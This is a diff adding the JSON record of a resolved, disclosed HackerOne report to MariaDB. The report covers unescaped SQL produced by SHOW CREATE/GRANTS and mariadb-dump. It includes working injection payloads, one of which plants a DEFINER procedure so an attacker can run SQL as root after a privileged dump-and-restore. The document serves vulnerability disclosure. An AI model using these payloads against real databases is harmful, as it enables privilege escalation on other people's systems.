@@ -1,0 +1,105 @@
+{
+  "id": 3848978,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQ4OTc4",
+  "url": "https://hackerone.com/reports/3848978",
+  "title": "`SHOW [CREATE|GRANTS] ...` / `mariadb-dump` Unescaped SQL Generation",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-07T16:42:29.345Z",
+  "submitted_at": "2026-07-07T16:42:29.820Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortfu",
+    "url": "/vortfu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:52:26.536Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:52:24.345Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "MariaDB has several `SHOW ...` paths that output SQL built from stored metadata that is not appropriately escaped.\n\nWhile not necessarily a vulnerability in the server itself, it opens an attack surface where a privileged user / service helper script exports an attacker controlled database with something like `mariadb-dump` and then imports the generated SQL elsewhere - potentially running any attacker injected SQL with elevated privileges.\n\n\n## Proof of Concept\n\nA typical attacker controlled injection payload might look something like the following:\n\n```sql\nCREATE TABLE poc (\n  id INT\n)\nENGINE=InnoDB\nDATA DIRECTORY='/tmp/mdb-show-unescaped/'';CREATE PROCEDURE vf_exec(q TEXT) SQL SECURITY DEFINER EXECUTE IMMEDIATE q;GRANT EXECUTE ON PROCEDURE vf_exec TO ''attacker''@''localhost''; -- ';\n```\n\n`SHOW CREATE TABLE poc;` / `mariadb-dump` would then output:\n\n> ```sql\n> CREATE TABLE `poc` (\n>   `id` int(11) DEFAULT NULL\n> ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_uca1400_ai_ci DATA DIRECTORY='/tmp/mdb-show-unescaped/';\n> CREATE PROCEDURE vf_exec(q TEXT) SQL SECURITY DEFINER EXECUTE IMMEDIATE q;\n> GRANT EXECUTE ON PROCEDURE vf_exec TO 'attacker'@'localhost'; -- /';\n> ```\n\nIf the db is then dumped and restored by privileged user, e.g.\n\n```\nmariadb-dump -uroot attacker_old > attacker.sql;\nmariadb -uroot attacker_new < attacker.sql;\n```\n\n`'attacker'@'localhost'` is then able to execute commands on `attacker_new` as the importing user, e.g.\n\n```sql\nCALL vf_exec( 'SHOW GRANTS' );\n```\n\n> ```sql\n> GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` WITH GRANT OPTION\n> ```\n\n\nA (non-comprehensive) list of injection points is included below, but the TL;DR is that all untrusted identifiers, literals, comments etc should be correctly escaped when outputting dynamically generated SQL queries.\n\n\n```sql\n-- create some helper directories with InnoDB so we can use MyISAM for poc\nCREATE TABLE make_data_dir (id INT)\nENGINE=InnoDB\nDATA DIRECTORY='/tmp/mdb-show-unescaped-data''; SELECT ''<INJECTION:DATA_DIRECTORY>''; /*';\n\nCREATE TABLE make_index_dir (id INT)\nENGINE=InnoDB\nDATA DIRECTORY='/tmp/mdb-show-unescaped-index*/; SELECT ''<INJECTION:INDEX_DIRECTORY>''; -- ';\n\nDROP TABLE make_data_dir, make_index_dir;\n\n-- ignore the intentionally bad table option below\nSET SESSION sql_mode='IGNORE_BAD_TABLE_OPTIONS';\n\nCREATE TABLE poc (\n  id INT,\n  KEY(id)\n)\nENGINE=MyISAM\nDATA DIRECTORY='/tmp/mdb-show-unescaped-data''; SELECT ''<INJECTION:DATA_DIRECTORY>''; /*'\nINDEX DIRECTORY='/tmp/mdb-show-unescaped-index*/; SELECT ''<INJECTION:INDEX_DIRECTORY>''; -- '\nunknown_opt='*/; SELECT \"<INJECTION:BAD_OPTION>\"; ALTER TABLE poc /*';\n\nSET SESSION sql_mode='';\n\nSHOW CREATE TABLE poc;\n```\n\n> ```sql\n> CREATE TABLE `poc` (\n>   `id` int(11) DEFAULT NULL,\n>   KEY `id` (`id`)\n> ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_uca1400_ai_ci /* `unknown_opt`='*/;\n> SELECT \"<INJECTION:BAD_OPTION>\";\n> ALTER TABLE poc /*' */ DATA DIRECTORY='/tmp/mdb-show-unescaped-data';\n> SELECT '<INJECTION:DATA_DIRECTORY>';\n> /*/' INDEX DIRECTORY='/tmp/mdb-show-unescaped-index*/;\n> SELECT '<INJECTION:INDEX_DIRECTORY>';\n> -- /'\n> ```\n\n\nThe next few require elevated privs to begin with, but are included because we should be escaping things correctly everywhere.\n\n```sql\nCREATE USER 'poc'@'localhost'\n  IDENTIFIED VIA unix_socket\n  USING 'x''; SELECT ''<INJECTION:AUTH_STRING>''; /*'\n  REQUIRE SUBJECT '*/; SELECT ''<INJECTION:SSL_SUBJECT>''; -- ';\n\nCREATE USER 'poc''@''localhost'' TO ''poc''@''localhost''; SELECT ''<INJECTION:PROXY>''; -- '@'localhost';\n\nGRANT PROXY ON\n  'poc''@''localhost'' TO ''poc''@''localhost''; SELECT ''<INJECTION:PROXY>''; -- '@'localhost'\nTO\n  'poc'@'localhost';\n\nSHOW CREATE USER 'poc'@'localhost';\nSHOW CREATE USER 'poc''@''localhost'' TO ''poc''@''localhost''; SELECT ''<INJECTION:PROXY>''; -- '@'localhost';\n\nSHOW GRANTS FOR 'poc'@'localhost';\n```\n\n> ```sql\n> CREATE USER `poc`@`localhost`\n> IDENTIFIED VIA unix_socket\n> USING 'x';\n> SELECT '<INJECTION:AUTH_STRING>';\n> /*' REQUIRE SUBJECT '*/;\n> SELECT '<INJECTION:SSL_SUBJECT>';\n> \n> CREATE USER `poc'@'localhost' TO 'poc'@'localhost'; SELECT '<INJECTION:PROXY>'; -- `@`localhost`;\n> \n> GRANT USAGE ON *.* TO `poc`@`localhost`\n> IDENTIFIED VIA unix_socket\n> USING 'x';\n> SELECT '<INJECTION:AUTH_STRING>';\n> /*' REQUIRE SUBJECT '*/;\n> SELECT '<INJECTION:SSL_SUBJECT>';\n> \n> GRANT PROXY ON 'poc'@'localhost' TO 'poc'@'localhost';\n> SELECT '<INJECTION:PROXY>';\n> ```\n\n\n```sql\nCREATE SERVER poc\nFOREIGN DATA WRAPPER `mysql OPTIONS (HOST '127.0.0.1'); SELECT '<INJECTION:SERVER_WRAPPER>'; -- `\nOPTIONS (\n  HOST '127.0.0.1',\n  DATABASE 'db',\n  USER 'u',\n  PASSWORD 'p',\n  PORT 3306\n);\n\nSHOW CREATE SERVER poc;\n```\n\n> ```sql\n> CREATE SERVER `poc` FOREIGN DATA WRAPPER mysql OPTIONS (HOST '127.0.0.1');\n> SELECT '<INJECTION:SERVER_WRAPPER>';\n> --  OPTIONS (HOST '127.0.0.1', DATABASE 'db', USER 'u', PASSWORD 'p', PORT '3306');\n> ```\n\n<insert pokemon meme here>\nGotta fix em all!\n\n\n## Same same but different ...\n\nIn addition to `SHOW [CREATE|GRANTS] ...` not escaping output correctly, `mariadb-dump` may also output dynamically generated SQL queries without using the appropriate escaping. e.g.\n\n\n### mariadb-dump --add-drop-trigger\n\nMalicious trigger names can be used to only inject when `mariadb-dump` adds a the drop trigger.\n\n```sql\nCREATE TABLE poc(i INT);\n\nCREATE TRIGGER `poc*/; SELECT '<INJECTION:DUMP_TRIGGER>'; /*`\nBEFORE INSERT ON poc\nFOR EACH ROW\nSET NEW.id = NEW.id;\n\nSHOW CREATE TRIGGER `poc*/; SELECT '<INJECTION:DUMP_TRIGGER>'; /*`;\n```\n\nThe output from `SHOW CREATE TRIGGER` is escaped fine here\n\n> ```sql\n> CREATE DEFINER=`attacker`@`localhost` TRIGGER `poc*/; SELECT '<INJECTION:DUMP_TRIGGER>'; /*`\n> BEFORE INSERT ON poc\n> FOR EACH ROW\n> SET NEW.id = NEW.id\n> ```\n\nbut by adding the drop trigger, `mariadb-dump` outputs\n\n```sql\n/*!50032 DROP TRIGGER IF EXISTS poc*/;\nSELECT '<INJECTION:DUMP_TRIGGER>';\n/* */;\n```\n\n\n### mariadb-dump --system=udfs\n\nLikewise with function names (an even more highly unlikely attack scenario, but added here for completeness - though there might also be other areas which should also be fixed).\n\n```sql\nINSERT INTO mysql.func(name, ret, dl, type)\nVALUES(\n  'mysql.f() RETURNS INT RETURN 1;SELECT ''<INJECTION:UDF_NAME>'';#',\n  0,\n  'x.so',\n  'function'\n);\n```\n\n`mariadb-dump` will `SELECT * FROM mysql.func` but reconstruct the `CREATE FUNCTION ...` output without the proper escaping, e.g.\n\n```sql\nCREATE FUNCTION mysql.f() RETURNS INT RETURN 1;\nSELECT '<INJECTION:UDF_NAME>';\n# RETURNS STRING SONAME 'x.so';\n```\n\n\n### mariadb-dump --dump-slave\n\nSlaves too ...\n\n```sql\nCHANGE MASTER TO\n  MASTER_HOST='h'', MASTER_PORT=3306, MASTER_LOG_FILE=''bin.000001'', MASTER_LOG_POS=4; SELECT ''<INJECTION:DUMP_SLAVE>''; -- ',\n  MASTER_PORT=3306,\n  MASTER_LOG_FILE='bin.000001',\n  MASTER_LOG_POS=4;\n```\n\n> ```sql\n> SELECT\n>   Connection_name,\n>   Master_Host,\n>   Master_Port,\n>   Relay_Master_Log_File,\n>   Exec_Master_Log_Pos\n> FROM information_schema.SLAVE_STATUS;\n> ```\n\nand `mariadb-dump` will then output\n\n```sql\nCHANGE MASTER '' TO MASTER_HOST='h', MASTER_PORT=3306, MASTER_LOG_FILE='bin.000001', MASTER_LOG_POS=4;\nSELECT '<INJECTION:DUMP_SLAVE>';\n-- ', MASTER_PORT=3306, MASTER_LOG_FILE='bin.000001', MASTER_LOG_POS=4;\n```\n\n## Impact\n\nAdmin / migration script helpers may unknowingly create SQL output containing attacker injected queries if ran against an attacker controlled db. Importing this SQL then executes those commands as the user running the import.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:52:24.739Z",
+  "allow_singular_disclosure_after": -4606.507724359,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "inzamulsepoy"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
